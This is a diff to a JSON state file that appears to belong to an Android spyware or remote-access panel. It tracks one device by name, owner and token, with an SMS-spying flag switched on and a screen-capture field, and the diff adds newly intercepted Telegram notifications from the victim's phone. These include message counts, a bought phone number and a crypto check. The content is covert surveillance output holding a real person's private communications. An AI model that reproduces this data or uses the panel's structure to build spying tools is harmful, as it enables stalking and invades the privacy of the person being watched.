@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777061899838,
+    "lastSeen": 1777061902948,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ ubilll・14917 pesan baru dari 127 obrolan",
+        "time": "25/04 03:18",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061904372
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******16\n• Waktu: 25/04/2026, 03.13",
+        "time": "25/04 03:18",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061902928
+      },
+      {
+        "appName": "Telegram",
+        "sender": "LumenAssist [Discussions]: LumenAssist",
+        "content": "🦋 Чек на 🪙 1.4 ETH ($3248.37).",
+        "time": "25/04 03:18",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061902865
+      },
+      {
+        "appName": "Telegram",
+        "sender": "OSINT_INSPECTOR",
+        "content": "MAAF TADI UPDATE MAKANYA BOT OFF",
+        "time": "25/04 03:18",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777061902756
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
